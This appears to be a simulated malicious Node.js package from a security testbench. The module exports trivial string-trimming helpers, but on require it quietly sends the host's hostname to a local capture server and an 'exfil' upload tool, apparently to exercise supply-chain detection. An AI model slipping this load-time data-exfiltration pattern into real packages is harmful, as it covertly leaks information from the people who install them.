const http = require('http');
const os = require('os');

function postCapture(note) {
  if (process.env.TESTBENCH_MODE !== 'enabled') return;
  const payload = {
    hostname: os.hostname(),
    timestamp: Date.now(),
    note: note || 'metadata-manipulation-sim',
  };
  const data = JSON.stringify(payload);
  const req = http.request(
    {
      hostname: '127.0.0.1',
      port: 3001,
      path: '/capture',
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
    },
    (res) => {
      res.resume();
    },
  );
  req.on('error', () => {});
  req.write(data);
  req.end();
  try {
    const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
    uploadJson('13', 'metadata-exfil', payload);
  } catch (_) {}
}

module.exports = {
  trim: (s) => (typeof s === 'string' ? s.trim() : s),
  normalizeWhitespace: (s) => (typeof s === 'string' ? s.replace(/\s+/g, ' ').trim() : s),
};

// Fire on require so "Run the victim" still produces a capture if install ran without the mock up
postCapture('metadata-manipulation-sim-load');
